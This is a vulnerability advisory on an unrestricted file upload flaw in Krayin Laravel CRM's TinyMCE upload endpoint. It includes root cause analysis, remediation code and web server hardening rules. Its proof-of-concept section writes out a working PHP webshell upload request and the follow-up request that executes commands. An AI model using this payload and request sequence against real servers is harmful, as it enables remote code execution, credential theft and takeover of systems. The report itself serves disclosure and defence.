# Security Vulnerability Report

## Unrestricted File Upload Leading to Remote Code Execution (RCE)
### Krayin Laravel CRM — `TinyMCEController::storeMedia()`

---

| Field              | Details                                                                 |
|--------------------|-------------------------------------------------------------------------|
| **Product**        | Krayin Laravel CRM                                                      |
| **Version**        | v2.2.0 (latest as of 14 April 2026)                                     |
| **Repository**     | https://github.com/krayin/laravel-crm                                   |
| **Affected File**  | `packages/Webkul/Admin/src/Http/Controllers/TinyMCEController.php`      |
| **Vulnerable Route** | `POST /admin/tinymce/upload`                                          |
| **Vulnerability Type** | Unrestricted File Upload → Remote Code Execution (RCE)            |
| **CVSS v3.1 Score** | **8.8 (High)** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`              |
| **CWE**            | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) — Unrestricted Upload of File with Dangerous Type |
| **Reported By**    | Independent Security Researcher                                         |
| **Report Date**    | 14 April 2026                                                           |
| **Status**         | Confirmed — PoC successfully executed on `demo.krayincrm.com`           |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Affected Component](#2-affected-component)
3. [Root Cause Analysis](#3-root-cause-analysis)
4. [Proof of Concept](#4-proof-of-concept)
5. [Impact](#5-impact)
6. [Remediation](#6-remediation)
7. [Timeline](#7-timeline)
8. [References](#8-references)

---

## 1. Executive Summary

The `TinyMCEController::storeMedia()` endpoint in Krayin Laravel CRM **does not validate the type or extension of uploaded files**. Any authenticated user can upload a file with a `.php` extension by spoofing the `Content-Type` header to `image/png`. Because uploaded files are stored under a publicly accessible path (`/storage/tinymce/`) and the web server executes PHP files served from that directory, the attacker can immediately request the uploaded file and achieve **Remote Code Execution (RCE)** on the server.

Exploitation requires only a **valid CRM session** (any role that has access to the TinyMCE-powered editor, e.g., email template editing), making this vulnerability accessible to a broad set of authenticated users.

---

## 2. Affected Component

**Route definition** (`packages/Webkul/Admin/src/Routes/Admin/rest-routes.php`):

```php
Route::post('tinymce/upload', [TinyMCEController::class, 'storeMedia'])
    ->name('admin.tinymce.upload');
```

**Vulnerable controller method** (`packages/Webkul/Admin/src/Http/Controllers/TinyMCEController.php`):

```php
public function storeMedia(): array
{
    if (! request()->hasFile('file')) {
        return [];
    }

    $file = request()->file('file');

    // ❌ No extension whitelist
    // ❌ No real MIME type detection (guessExtension / getMimeType)
    // ❌ Client-controlled extension is used directly
    $filename = md5($file->getClientOriginalName() . time())
              . '.' . $file->getClientOriginalExtension();

    // File is stored on the 'public' disk — web-accessible
    $path = $file->storeAs($this->storagePath, $filename);

    // Only SVG files receive any sanitization; .php is untouched
    $this->sanitizeSVG($path, $file);

    // Returns the public URL to the caller
    return ['location' => Storage::url($path)];
}
```

**Three root weaknesses in a single method:**

| # | Weakness | Detail |
|---|----------|--------|
| 1 | No extension validation | `getClientOriginalExtension()` blindly trusts the filename supplied by the client |
| 2 | No MIME-type detection | `Content-Type: image/png` is trusted; `guessExtension()` / `finfo` is never called |
| 3 | Files stored under web root | `Storage::disk('public')` maps to `storage/app/public/` which is symlinked to `public/storage/`, making every uploaded file directly accessible and executable by the web server |

---

## 3. Root Cause Analysis

The `sanitizeSVG` helper (in `Webkul\Core\Traits\Sanitizer`) only processes files whose extension contains `svg`:

```php
public function sanitizeSvg(string $path, UploadedFile $file): void
{
    if (! $this->isSvgFile($file)) {
        return;   // All non-SVG files, including .php, pass through untouched
    }
    // ...
}
```

The Laravel `mimes:` validation rule is **never applied** to this endpoint, meaning there is no server-side gating on what file types may be stored. The combination of a publicly routed storage disk and an Apache/Nginx configuration that executes PHP scripts provides the final link in the exploit chain.

---

## 4. Proof of Concept

### Step 1 — Upload a PHP Webshell

```http
POST /admin/tinymce/upload HTTP/2
Host: demo.krayincrm.com
Cookie: krayin_crm_session=<valid_session>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="_token"

<valid_csrf_token>
------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------boundary--
```

**Server Response (HTTP 200):**

```json
{
  "location": "https://demo.krayincrm.com/.../storage/tinymce/1a99ac14cff1526e28b7eb00f1b9ab60.php"
}
```

The server accepted the upload and returned the publicly accessible URL of the PHP file.

---

### Step 2 — Execute Arbitrary Commands

```http
GET /storage/tinymce/1a99ac14cff1526e28b7eb00f1b9ab60.php HTTP/2
Host: demo.krayincrm.com
```

**Server Response (HTTP 200):**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The PHP payload was executed by the web server, confirming full Remote Code Execution under the `www-data` process identity.

### Attack Flow Diagram

```
Authenticated User
       │
       │  POST /admin/tinymce/upload
       │  filename="shell.php"
       │  Content-Type: image/png
       ▼
┌─────────────────────────────────┐
│  TinyMCEController::storeMedia  │
│  • No MIME check                │
│  • No extension whitelist       │
│  • Stores to public disk        │
└────────────────┬────────────────┘
                 │  shell.php saved to
                 │  /storage/tinymce/
                 ▼
        Web Server (Apache/Nginx)
        PHP execution enabled in
        /storage/tinymce/
                 │
                 │  GET /storage/tinymce/shell.php
                 ▼
         ┌──────────────┐
         │  RCE as      │
         │  www-data    │
         └──────────────┘
```

---

## 5. Impact

| Dimension        | Description |
|------------------|-------------|
| **Confidentiality** | Full read access to the server filesystem, including `.env` (database credentials, `APP_KEY`, SMTP secrets, API keys) |
| **Integrity** | Write/delete arbitrary files, modify source code, plant persistent backdoors, alter database records |
| **Availability** | Drop database, exhaust resources, disable the application |
| **Lateral Movement** | Pivot to internal services reachable from the server: MySQL, Redis, Memcached, internal APIs |
| **Privilege Escalation** | Leverage `www-data` shell to exploit local kernel/service vulnerabilities for root access |
| **Persistence** | Deploy additional webshells, add SSH authorized keys, schedule cron jobs |

**Attack Prerequisite:** A single valid CRM account with access to any TinyMCE-powered editor (email template editor, quote editor, etc.). No administrator privileges are required.

---

## 6. Remediation

### 6.1 Immediate Fix — Enforce Strict File Validation

Add a validation rule to `storeMedia()` **before** storing the file:

```php
public function storeMedia(): array
{
    $this->validate(request(), [
        'file' => [
            'required',
            'file',
            'mimes:jpg,jpeg,png,gif,webp,svg',
            'max:5120', // 5 MB
        ],
    ]);

    $file = request()->file('file');

    // Use server-side MIME detection, not client-supplied extension
    $extension = $file->guessExtension();
    $allowed   = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg'];

    if (! in_array($extension, $allowed, true)) {
        abort(422, 'File type not allowed.');
    }

    $filename = md5($file->getClientOriginalName() . time()) . '.' . $extension;
    $path     = $file->storeAs($this->storagePath, $filename);

    $this->sanitizeSVG($path, $file);

    return ['location' => Storage::url($path)];
}
```

### 6.2 Defense-in-Depth — Store Files Outside Web Root

Move TinyMCE uploads to a **private disk** and serve them through a controller:

```php
// Store on private disk (not web-accessible)
$path = $file->storeAs('tinymce', $filename); // defaults to 'local' disk

// Serve via a dedicated route with authorization
return ['location' => route('admin.tinymce.media', ['path' => $path])];
```

### 6.3 Web Server Hardening

Prevent PHP execution inside the storage directory regardless of application-level controls:

**Nginx:**

```nginx
location ~* ^/storage/.*\.php$ {
    return 403;
}
```

**Apache (`.htaccess` inside `public/storage/`):**

```apache
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>
```

---

## 7. Timeline

| Date | Event |
|------|-------|
| 14 April 2026 | Vulnerability discovered via static code analysis |
| 14 April 2026 | PoC successfully confirmed on `demo.krayincrm.com` |
| 14 April 2026 | Vulnerability report drafted and submitted to vendor |

---

## 8. References

- [CWE-434 — Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Testing Guide — OTG-BUSLOGIC-009](https://owasp.org/www-project-web-security-testing-guide/)
- Affected source: `packages/Webkul/Admin/src/Http/Controllers/TinyMCEController.php`
- Krayin CRM GitHub: https://github.com/krayin/laravel-crm
